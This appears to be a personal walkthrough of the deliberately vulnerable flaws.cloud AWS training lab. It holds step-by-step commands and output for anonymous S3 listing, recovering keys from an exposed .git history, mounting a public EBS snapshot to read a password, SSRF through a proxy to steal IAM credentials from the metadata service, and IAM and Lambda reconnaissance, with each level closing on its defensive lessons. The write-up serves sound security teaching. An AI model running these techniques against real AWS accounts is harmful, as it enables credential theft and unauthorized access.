# flaws.cloud.notes
Notes on flaws.cloud

Site: http://flaws.cloud/

# Level 1

"This level is *buckets* of fun. See if you can find the first sub-domain."

"Need a hint? Visit Hint 1"

`nslookup flaws.cloud`

```
Non-authoritative answer:
Name:    flaws.cloud
Address:  52.218.225.114
```

`nslookup flaws.cloud.s3.amazonaws.com`

```
Non-authoritative answer:
Name:    s3-us-west-2-w.amazonaws.com
Address:  52.218.204.50
Aliases:  flaws.cloud.s3.amazonaws.com
```

What will help you for this level is to know its permissions are a little loose.

Need another hint? Go to Hint 2

Attempt to list all bucket files, passing "--no-sign-request" ie, Everyone public access

`aws s3 ls s3://flaws.cloud/ --no-sign-request --region us-west-2`

```
2017-03-13 23:00:38       2575 hint1.html
2017-03-02 23:05:17       1707 hint2.html
2017-03-02 23:05:11       1101 hint3.html
2020-05-22 14:16:45       3162 index.html
2018-07-10 12:47:16      15979 logo.png  
2017-02-26 20:59:28         46 robots.txt
2017-02-26 20:59:30       1051 secret-dd02c7c.html
```

Dump secret file to console: 

`aws s3 cp s3://flaws.cloud/secret-dd02c7c.html - --no-sign-request --region us-west-2`

```
<html>
    <head>
        <title>flAWS</title>
        <META NAME="ROBOTS" CONTENT="NOINDEX, NOFOLLOW">
        <style>
            body { font-family: Andale Mono, monospace; }
            :not(center) > pre { background-color: #202020; padding: 4px; border-radius: 5px; border-color:#00d000;
            border-width: 1px; border-style: solid;}
        </style>
    </head>
<body
  text="#00d000"
  bgcolor="#000000"
  style="max-width:800px; margin-left:auto ;margin-right:auto"
  vlink="#00ff00" link="#00ff00">

<center>
<pre >
 _____  _       ____  __    __  _____
|     || |     /    ||  |__|  |/ ___/
|   __|| |    |  o  ||  |  |  (   \_
|  |_  | |___ |     ||  |  |  |\__  |
|   _] |     ||  _  ||  `  '  |/  \ |
|  |   |     ||  |  | \      / \    |
|__|   |_____||__|__|  \_/\_/   \___|
</pre>

<h1>Congrats! You found the secret file!</h1>
</center>


Level 2 is at <a href="http://level2-c8b217a33fcf1f839f6f1f73a00a9ae7.flaws.cloud">http://level2-c8b217a33fcf1f839f6f1f73a00a9ae7.flaws.cloud</a>
```

## Lesson learned:

```
For S3 buckets hosting public websites, we do not need to / should not grant Everyone List. 
```

# Level 2

The next level is fairly similar, with a slight twist. You're going to need your own AWS account for this. You just need the free tier.

For hints, see Hint 1

List all bucket files, assuming 'Authenticated AWS User' permissions: 

`aws s3 --profile YOUR_ACCOUNT ls s3://level2-c8b217a33fcf1f839f6f1f73a00a9ae7.flaws.cloud`

```
2017-02-26 21:02:15      80751 everyone.png
2017-03-02 22:47:17       1433 hint1.html
2017-02-26 21:04:39       1035 hint2.html
2017-02-26 21:02:14       2786 index.html
2017-02-26 21:02:14         26 robots.txt
2017-02-26 21:02:15       1051 secret-e4443fc.html
```

## Lesson Learned:

```
For S3 buckets hosting public websites, we do not need to / should not grant Any Authenticated AWS User List 
```

# Level 3
The next level is fairly similar, with a slight twist. Time to find your first AWS key! I bet you'll find something that will let you list what other buckets are.

For hints, see Hint 1

List all bucket files, assuming 'Authenticated AWS User' permissions: 

`aws s3 ls s3://level3-9afd3927f195e10225021a578e6f78df.flaws.cloud/ --region us-west-2`

```
                           PRE .git/
2017-02-26 19:14:33     123637 authenticated_users.png
2017-02-26 19:14:34       1552 hint1.html
2017-02-26 19:14:34       1426 hint2.html
2017-02-26 19:14:35       1247 hint3.html
2017-02-26 19:14:33       1035 hint4.html
2020-05-22 14:21:10       1861 index.html
2017-02-26 19:14:33         26 robots.txt
```

We see ".git/" folder, pull all files down: 

`aws s3 sync s3://level3-9afd3927f195e10225021a578e6f78df.flaws.cloud/ . --no-sign-request --region us-west-2`

Check git log: 

`git log`

```
commit b64c8dcfa8a39af06521cf4cb7cdce5f0ca9e526 (HEAD -> master)
Author: 0xdabbad00 <scott@summitroute.com>
Date:   Sun Sep 17 09:10:43 2017 -0600

    Oops, accidentally added something I shouldn't have

commit f52ec03b227ea6094b04e43f475fb0126edb5a61
Author: 0xdabbad00 <scott@summitroute.com>
Date:   Sun Sep 17 09:10:07 2017 -0600

    first commit
```

Show bad commit: 

`git checkout f52ec03b227ea6094b04e43f475fb0126edb5a61`

Check files: 

`ls`

```
Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----
-a----        10/30/2021  11:40 AM             93 access_keys.txt
-a----         2/26/2017   7:14 PM         123637 authenticated_users.png
-a----         2/26/2017   7:14 PM           1552 hint1.html
-a----         2/26/2017   7:14 PM           1426 hint2.html
-a----         2/26/2017   7:14 PM           1247 hint3.html
-a----         2/26/2017   7:14 PM           1035 hint4.html
-a----         5/22/2020   2:21 PM           1861 index.html
-a----        10/30/2021  10:10 AM           1088 LICENSE
-a----         2/26/2017   7:14 PM             26 robots.txt
```

View access keys: 

`cat access_keys.txt`
```
(redacted)
```

Create local profile using the access keys: 

`aws configure --profile flaws`

List all buckets: 

`aws --profile flaws s3 ls`
```
2017-02-12 16:31:07 2f4e53154c0a7fd086a04a12a452c2a4caed8da0.flaws.cloud
2017-05-29 12:34:53 config-bucket-975426262029
2017-02-12 15:03:24 flaws-logs
2017-02-04 22:40:07 flaws.cloud
2017-02-23 20:54:13 level2-c8b217a33fcf1f839f6f1f73a00a9ae7.flaws.cloud
2017-02-26 13:15:44 level3-9afd3927f195e10225021a578e6f78df.flaws.cloud
2017-02-26 13:16:06 level4-1156739cfb264ced6de514971a4bef68.flaws.cloud
2017-02-26 14:44:51 level5-d2891f604d2061b6977c2481b0c8333e.flaws.cloud
2017-02-26 14:47:58 level6-cc4c404a8a8b876167f5e70a7d8c9880.flaws.cloud
2017-02-26 15:06:32 theend-797237e8ada164bf9f12cebf93b282cf.flaws.cloud
```

## Lesson Learned: 
```
Revoke all keys that could have been leaked or misplaced
```
```
There is no way to limit which buckets a user with 'ListBuckets' permission can list. It is all or none.
```

# Level 4
For the next level, you need to get access to the web page running on an EC2 at 4d0cf09b9b2d761a7d87be99d17507bce8b86f3b.flaws.cloud

It'll be useful to know that a snapshot was made of that EC2 shortly after nginx was setup on it.

Need a hint? Go to Hint 1

List all public EC2 snapshots in the target account: 

`aws --profile default ec2 describe-snapshots --owner-id 975426262029 --region us-west-2`

```
{
    "Snapshots": [
        {
            "Description": "",
            "Encrypted": false,
            "OwnerId": "975426262029",
            "Progress": "100%",
            "SnapshotId": "snap-0b49342abd1bdcb89",
            "StartTime": "2017-02-28T01:35:12+00:00",
            "State": "completed",
            "VolumeId": "vol-04f1c039bc13ea950",
            "VolumeSize": 8,
            "Tags": [
                {
                    "Key": "Name",
                    "Value": "flaws backup 2017.02.27"
                }
            ]
        }
    ]
}
```

Create keypair for EC2: 

`aws --profile default ec2 create-key-pair --key-name flawscloud --region us-west-2`

```
{
    "KeyFingerprint": "75:40:79:e2:da:0a:2b:4d:da:24:9a:29:7d:09:23:3d:11:65:e4:53",
    "KeyMaterial": "-----BEGIN RSA PRIVATE KEY-----
    (redacted)
-----END RSA PRIVATE KEY-----",
    "KeyName": "flawscloud",
    "KeyPairId": "key-0d1f3a0680a3c081a"
}
```
..save as 'flawscloud' in ~/.ssh/, being sure to watch newlines are correct

Add to ssh agent: 

`ssh-add ~/.ssh/flawscloud`

Create a Security Group: 

`aws --profile default ec2 create-security-group --description 'SG for flawscloud' --group-name flawscloudsg  --region us-west-2`

```
{
    "GroupId": "sg-09217e837763bd24a"
}
```

Allow ingress from our IP over 22: 

`aws --profile default ec2 authorize-security-group-ingress --group-id sg-09217e837763bd24a --protocol tcp --port 22 --cidr <myip>/32 --region us-west-2`
```
{
    "Return": true,
    "SecurityGroupRules": [
        {
            "SecurityGroupRuleId": "sgr-06c7cad93cd8d9514",
            "GroupId": "sg-09217e837763bd24a",
            "GroupOwnerId": "(redacted)",
            "IsEgress": false,
            "IpProtocol": "tcp",
            "FromPort": 22,
            "ToPort": 22,
            "CidrIpv4": "(redacted)/32"
        }
    ]
}
```

Launch public EC2 instance using security group, keypair and public snapshot: 

`aws --profile default ec2 run-instances --image-id ami-0d4a468c8fcc4b5f0 --instance-type t2.small --security-group-ids sg-09217e837763bd24a --key-name flawscloud --associate-public-ip-address --placement AvailabilityZone=us-west-2a --block-device-mapping 'DeviceName=/dev/sdf,Ebs={SnapshotId=snap-0b49342abd1bdcb89}' --region us-west-2`

```
{
    "Groups": [],
    "Instances": [
        {
            "AmiLaunchIndex": 0,
            "ImageId": "ami-0d4a468c8fcc4b5f0",
            "InstanceId": "i-06f800f17d60265bb",
            "InstanceType": "t2.small",
            "KeyName": "flawscloud",
            "LaunchTime": "2021-10-30T18:22:04+00:00",
            "Monitoring": {
                "State": "disabled"
            },
            "Placement": {
                "AvailabilityZone": "us-west-2a",
                "GroupName": "",
                "Tenancy": "default"
            },
            "PrivateDnsName": "ip-172-31-46-72.us-west-2.compute.internal",
            "PrivateIpAddress": "172.31.46.72",
            "ProductCodes": [],
            "PublicDnsName": "",
            "State": {
                "Code": 0,
                "Name": "pending"
            },
            "StateTransitionReason": "",
            "SubnetId": "subnet-031927be2681a457f",
            "VpcId": "vpc-0e0c2bfa8a4946201",
            "Architecture": "x86_64",
            "BlockDeviceMappings": [],
            "ClientToken": "d1b585a2-b895-47ff-95fb-b9bdb6a833cd",
            "EbsOptimized": false,
            "EnaSupport": true,
            "Hypervisor": "xen",
            "NetworkInterfaces": [
                {
                    "Attachment": {
                        "AttachTime": "2021-10-30T18:22:04+00:00",
                        "AttachmentId": "eni-attach-0d91f06d21becf41d",
                        "DeleteOnTermination": true,
                        "DeviceIndex": 0,
                        "Status": "attaching",
                        "NetworkCardIndex": 0
                    },
                    "Description": "",
                    "Groups": [
                        {
                            "GroupName": "flawscloudsg",
                            "GroupId": "sg-09217e837763bd24a"
                        }
                    ],
                    "Ipv6Addresses": [],
                    "MacAddress": "06:27:7d:3f:14:5f",
                    "NetworkInterfaceId": "eni-0f1bdf24a9435f5f6",
                    "OwnerId": "(redacted)",
                    "PrivateDnsName": "ip-172-31-46-72.us-west-2.compute.internal",
                    "PrivateIpAddress": "172.31.46.72",
                    "PrivateIpAddresses": [
                        {
                            "Primary": true,
                            "PrivateDnsName": "ip-172-31-46-72.us-west-2.compute.internal",
                            "PrivateIpAddress": "172.31.46.72"
                        }
                    ],
                    "SourceDestCheck": true,
                    "Status": "in-use",
                    "SubnetId": "subnet-031927be2681a457f",
                    "VpcId": "vpc-0e0c2bfa8a4946201",
                    "InterfaceType": "interface"
                }
            ],
            "RootDeviceName": "/dev/sda1",
            "RootDeviceType": "ebs",
            "SecurityGroups": [
                {
                    "GroupName": "flawscloudsg",
                    "GroupId": "sg-09217e837763bd24a"
                }
            ],
            "SourceDestCheck": true,
            "StateReason": {
                "Code": "pending",
                "Message": "pending"
            },
            "VirtualizationType": "hvm",
            "CpuOptions": {
                "CoreCount": 1,
                "ThreadsPerCore": 1
            },
            "CapacityReservationSpecification": {
                "CapacityReservationPreference": "open"
            },
            "MetadataOptions": {
                "State": "pending",
                "HttpTokens": "optional",
                "HttpPutResponseHopLimit": 1,
                "HttpEndpoint": "enabled",
                "HttpProtocolIpv6": "disabled"
            },
            "EnclaveOptions": {
                "Enabled": false
            }
        }
    ],
    "OwnerId": "(redacted)",
    "ReservationId": "r-082bacaca7ba0e8fa"
}
```

Get instance public IP: 

`aws --profile default ec2 describe-instances --instance-ids i-06f800f17d60265bb --query "Reservations[*].Instances[*].PublicIpAddress" --output=text --region us-west-2`

```
54.201.91.237
```

SSH into instance: 

`ssh -i ~/.ssh/flawscloud ubuntu@54.201.91.237`

```
Welcome to Ubuntu 21.10 (GNU/Linux 5.13.0-1005-aws x86_64)
```

List blocks: 

`lsblk`

```
NAME    MAJ:MIN RM  SIZE RO TYPE MOUNTPOINT
loop0     7:0    0   25M  1 loop /snap/amazon-ssm-agent/4046
loop1     7:1    0 55.4M  1 loop /snap/core18/2128
loop2     7:2    0 61.8M  1 loop /snap/core20/1169
loop3     7:3    0 73.2M  1 loop /snap/lxd/21624
loop4     7:4    0 32.3M  1 loop /snap/snapd/13170
xvda    202:0    0    8G  0 disk
└─xvda1 202:1    0    8G  0 part /
xvdf    202:80   0    8G  0 disk
└─xvdf1 202:81   0    8G  0 part
```

Mount the snapshot volume (partition missing mount point in last command): 

`sudo mount /dev/xvdf1 /mnt`
`ls -al /mnt`

```
total 112
drwxr-xr-x 23 root root  4096 Feb 22  2017 .   
drwxr-xr-x 19 root root  4096 Oct 30 18:22 ..  
drwxr-xr-x  2 root root  4096 Feb 13  2017 bin 
drwxr-xr-x  3 root root  4096 Feb 22  2017 boot
drwxr-xr-x  5 root root  4096 Jan 13  2017 dev 
drwxr-xr-x 94 root root  4096 Feb 19  2017 etc 
drwxr-xr-x  3 root root  4096 Feb 12  2017 home
lrwxrwxrwx  1 root root    32 Feb 22  2017 initrd.img -> boot/initrd.img-4.4.0-64-generic
lrwxrwxrwx  1 root root    32 Feb 21  2017 initrd.img.old -> boot/initrd.img-4.4.0-63-generic
drwxr-xr-x 21 root root  4096 Jan 13  2017 lib
drwxr-xr-x  2 root root  4096 Jan 13  2017 lib64
drwx------  2 root root 16384 Jan 13  2017 lost+found
drwxr-xr-x  2 root root  4096 Jan 13  2017 media
drwxr-xr-x  2 root root  4096 Jan 13  2017 mnt
drwxr-xr-x  2 root root  4096 Jan 13  2017 opt
drwxr-xr-x  2 root root  4096 Apr 12  2016 proc
drwx------  3 root root  4096 Feb 19  2017 root
drwxr-xr-x  6 root root  4096 Jan 13  2017 run
drwxr-xr-x  2 root root 12288 Feb 13  2017 sbin
drwxr-xr-x  2 root root  4096 Jan  3  2017 snap
drwxr-xr-x  2 root root  4096 Jan 13  2017 srv
drwxr-xr-x  2 root root  4096 Feb  5  2016 sys
drwxrwxrwt  8 root root  4096 Feb 28  2017 tmp
drwxr-xr-x 10 root root  4096 Jan 13  2017 usr
drwxr-xr-x 14 root root  4096 Feb 12  2017 var
lrwxrwxrwx  1 root root    29 Feb 22  2017 vmlinuz -> boot/vmlinuz-4.4.0-64-generic
lrwxrwxrwx  1 root root    29 Feb 21  2017 vmlinuz.old -> boot/vmlinuz-4.4.0-63-generic
```

Read setup file, grab username and password: 

`cat /mnt/home/ubuntu/setupNginx.sh`

```
htpasswd -b /etc/nginx/.htpasswd (redacted) (redacted)
```

Enter username/password in site to navigate to Level 5: 

`http://4d0cf09b9b2d761a7d87be99d17507bce8b86f3b.flaws.cloud`

## Lessons Learned: 
```
EBS volume snapshots containing non-public data should never be made public
```
```
If an EBS volume snapshot needs to be shared with another AWS account, this is not done by making the snapshot public. It is done by specifically sharing the snapshot with the target account.
```

# Level 5
This EC2 has a simple HTTP only proxy on it. Here are some examples of it's usage:

http://4d0cf09b9b2d761a7d87be99d17507bce8b86f3b.flaws.cloud/proxy/flaws.cloud/

http://4d0cf09b9b2d761a7d87be99d17507bce8b86f3b.flaws.cloud/proxy/summitroute.com/blog/feed.xml

http://4d0cf09b9b2d761a7d87be99d17507bce8b86f3b.flaws.cloud/proxy/neverssl.com/

See if you can use this proxy to figure out how to list the contents of the level6 bucket at level6-cc4c404a8a8b876167f5e70a7d8c9880.flaws.cloud that has a hidden directory in it.

Need a hint? Go to Hint 1



Since this is a proxy, everything after the `/proxy/` statement is being redirected. 

So to navigate to cnn.com: 

`http://4d0cf09b9b2d761a7d87be99d17507bce8b86f3b.flaws.cloud/proxy/cnn.com/`

This means we can try to abuse the proxy to hit the metadata service, assuming IMDSv1 has not been disabled: 

`http://4d0cf09b9b2d761a7d87be99d17507bce8b86f3b.flaws.cloud/proxy/169.254.169.254/latest/meta-data/`
```
ami-id
ami-launch-index
ami-manifest-path
block-device-mapping/
events/
hostname
iam/
identity-credentials/
instance-action
instance-id
instance-life-cycle
instance-type
local-hostname
local-ipv4
mac
metrics/
network/
placement/
profile
public-hostname
public-ipv4
public-keys/
reservation-id
security-groups
services/
```

List hostname of instance: 

`http://4d0cf09b9b2d761a7d87be99d17507bce8b86f3b.flaws.cloud/proxy/169.254.169.254/latest/meta-data/hostname/`
```
ip-172-31-41-84.us-west-2.compute.internal
```

List instance profile info: 

`http://4d0cf09b9b2d761a7d87be99d17507bce8b86f3b.flaws.cloud/proxy/169.254.169.254/latest/meta-data/iam/info/`
```
{
  "Code" : "Success",
  "LastUpdated" : "2021-10-30T18:29:03Z",
  "InstanceProfileArn" : "arn:aws:iam::975426262029:instance-profile/flaws",
  "InstanceProfileId" : "AIPAIK7LV6U6UXJXQQR3Q"
}
```

List instance profile keys and token:

`http://4d0cf09b9b2d761a7d87be99d17507bce8b86f3b.flaws.cloud/proxy/169.254.169.254/latest/meta-data/iam/security-credentials/flaws/`
```
{
  "Code" : "Success",
  "LastUpdated" : "2021-10-30T18:29:12Z",
  "Type" : "AWS-HMAC",
  "AccessKeyId" : "(redacted)",
  "SecretAccessKey" : "(redacted)",
  "Token" : "(redacted)",
  "Expiration" : "2021-10-31T00:47:18Z"
}
```

Add the instance profile keys and token to our local AWS credentials (~/.aws/credentials): 
```
[level5]
aws_access_key_id = (redacted)
aws_secret_access_key = (redacted)
aws_session_token = (redacted)
```

Use the instance profile creds to list the files in the level6 bucket: 

`aws --profile level5 s3 ls level6-cc4c404a8a8b876167f5e70a7d8c9880.flaws.cloud`

```
                           PRE ddcc78ff/
2017-02-26 21:11:07        871 index.html
```

Next page is: 

`http://level6-cc4c404a8a8b876167f5e70a7d8c9880.flaws.cloud/ddcc78ff/`

## Lessons Learned: 
```
Ensure all EC2 instances require IMDSv2 and that IMDSv1 is not in use
```
```
Ensure all web applications do not allow any requests to the `169.254.169.254` address (metadata service)
```

# Level 6
For this final challenge, you're getting a user access key that has the SecurityAudit policy attached to it. See what else it can do and what else you might find in this AWS account.

Access key ID: (redacted)

Secret: (redacted)

Need a hint? Go to Hint 1

Add the access keys to our local AWS credentials (~/.aws/credentials): 
```
[level6]
aws_access_key_id = (redacted)
aws_secret_access_key = (redacted)
```

Determine IAM user name: 

`aws --profile level6 iam get-user`
```
{
    "User": {
        "Path": "/",
        "UserName": "Level6",
        "UserId": "AIDAIRMDOSCWGLCDWOG6A",
        "Arn": "arn:aws:iam::975426262029:user/Level6",
        "CreateDate": "2017-02-26T23:11:16+00:00"
    }
}
```
IAM user name is "Level6"

Determine IAM policies (and their ARNs) attached to this user: 

`aws --profile level6 iam list-attached-user-policies --user-name Level6`
```
{
    "AttachedPolicies": [
        {
            "PolicyName": "list_apigateways",
            "PolicyArn": "arn:aws:iam::975426262029:policy/list_apigateways"
        },
        {
            "PolicyName": "MySecurityAudit",
            "PolicyArn": "arn:aws:iam::975426262029:policy/MySecurityAudit"
        },
        {
            "PolicyName": "AWSCompromisedKeyQuarantine",
            "PolicyArn": "arn:aws:iam::aws:policy/AWSCompromisedKeyQuarantine"
        }
    ]
}
```

Get version ID (DefaultVersionId) of policy: 

`aws --profile level6 iam get-policy --policy-arn arn:aws:iam::975426262029:policy/list_apigateways`
```
{
    "Policy": {
        "PolicyName": "list_apigateways",
        "PolicyId": "ANPAIRLWTQMGKCSPGTAIO",
        "Arn": "arn:aws:iam::975426262029:policy/list_apigateways",
        "Path": "/",
        "DefaultVersionId": "v4",
        "AttachmentCount": 1,
        "PermissionsBoundaryUsageCount": 0,
        "IsAttachable": true,
        "Description": "List apigateways",
        "CreateDate": "2017-02-20T01:45:17+00:00",
        "UpdateDate": "2017-02-20T01:48:17+00:00",
        "Tags": []
    }
}
```

List policy permissions using policy arn and version:

`aws --profile level6 iam get-policy-version --policy-arn arn:aws:iam::975426262029:policy/list_apigateways --version-id v4`
```
{
    "PolicyVersion": {
        "Document": {
            "Version": "2012-10-17",
            "Statement": [
                {
                    "Action": [
                        "apigateway:GET"
                    ],
                    "Effect": "Allow",
                    "Resource": "arn:aws:apigateway:us-west-2::/restapis/*"
                }
            ]
        },
        "VersionId": "v4",
        "IsDefaultVersion": true,
        "CreateDate": "2017-02-20T01:48:17+00:00"
    }
}
```

List Lambda functions: 

`aws --region us-west-2 --profile level6 lambda list-functions`
```
{
    "Functions": [
        {
            "FunctionName": "Level6",
            "FunctionArn": "arn:aws:lambda:us-west-2:975426262029:function:Level6",
            "Runtime": "python2.7",
            "Role": "arn:aws:iam::975426262029:role/service-role/Level6",
            "Handler": "lambda_function.lambda_handler",
            "CodeSize": 282,
            "Description": "A starter AWS Lambda function.",
            "Timeout": 3,
            "MemorySize": 128,
            "LastModified": "2017-02-27T00:24:36.054+0000",
            "CodeSha256": "2iEjBytFbH91PXEMO5R/B9DqOgZ7OG/lqoBNZh5JyFw=",
            "Version": "$LATEST",
            "TracingConfig": {
                "Mode": "PassThrough"
            },
            "RevisionId": "98033dfd-defa-41a8-b820-1f20add9c77b",
            "PackageType": "Zip",
            "Architectures": [
                "x86_64"
            ]
        }
    ]
}
```

Get the policy on the Lambda function: 

`aws --region us-west-2 --profile level6 lambda get-policy --function-name Level6`
```
{
    "Policy": "{\"Version\":\"2012-10-17\",\"Id\":\"default\",\"Statement\":[{\"Sid\":\"904610a93f593b76ad66ed6ed82c0a8b\",\"Effect\":\"Allow\",\"Principal\":{\"Service\":\"apigateway.amazonaws.com\"},\"Action\":\"lambda:InvokeFunction\",\"Resource\":\"arn:aws:lambda:us-west-2:975426262029:function:Level6\",\"Condition\":{\"ArnLike\":{\"AWS:SourceArn\":\"arn:aws:execute-api:us-west-2:975426262029:s33ppypa75/*/GET/level6\"}}}]}",
    "RevisionId": "98033dfd-defa-41a8-b820-1f20add9c77b"
}
```

This tells us that the Lambda function can be run (InvokeFunction) from a specific gateway path (ArnLike/SourceArn). 

`https://s33ppypa75.execute-api.us-west-2.amazonaws.com/Prod/level6`

```
"Go to http://theend-797237e8ada164bf9f12cebf93b282cf.flaws.cloud/d730aa2b/"
```

`http://theend-797237e8ada164bf9f12cebf93b282cf.flaws.cloud/d730aa2b/`

```
 _____  _       ____  __    __  _____
|     || |     /    ||  |__|  |/ ___/
|   __|| |    |  o  ||  |  |  (   \_ 
|  |_  | |___ |     ||  |  |  |\__  |
|   _] |     ||  _  ||  `  '  |/  \ |
|  |   |     ||  |  | \      / \    |
|__|   |_____||__|__|  \_/\_/   \___|
flAWS - The End
```

## Lesson Learned
```
Read-only permissions can be used for recon by attackers, potentially disclosing a weakness in our config. 
```
```
One particular area where we should restrict read-only access is any permissions around IAM policy definitions. 
```
